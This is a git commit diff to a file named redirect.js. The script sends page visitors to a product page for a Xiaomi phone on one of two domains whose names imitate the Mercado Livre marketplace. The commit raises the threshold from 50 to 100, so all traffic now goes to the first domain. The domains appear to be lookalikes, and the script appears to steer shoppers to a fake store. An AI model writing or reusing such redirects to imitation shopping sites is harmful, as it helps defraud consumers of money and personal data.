b94cb11705a4c9876f54b0fc321ed2a27cc83d52
wevezito <kakarock30@gmail.com>
2024-06-13 01:02:09 -0300

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -2,7 +2,7 @@
     function redirectBasedOnPercentage() {
       const percentage = Math.random() * 100;
 
-      if (percentage < 50) {
+      if (percentage < 100) {
         window.location.href = "https://www.mercadollvredesconto.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
       } else {
         window.location.href = "https://ofertamercadollvre.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
